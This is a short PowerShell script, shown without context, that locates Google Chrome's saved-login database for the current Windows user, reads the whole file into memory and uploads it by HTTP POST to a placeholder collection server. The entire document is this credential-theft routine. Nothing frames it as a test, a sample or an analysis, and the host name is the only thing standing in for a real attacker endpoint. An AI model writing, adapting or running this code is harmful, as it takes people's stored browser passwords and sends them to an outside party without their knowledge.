$p = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Login Data'
$b = [IO.File]::ReadAllBytes($p)
Invoke-RestMethod -Uri 'https://collector.example.invalid/u' -Method Post -Body $b
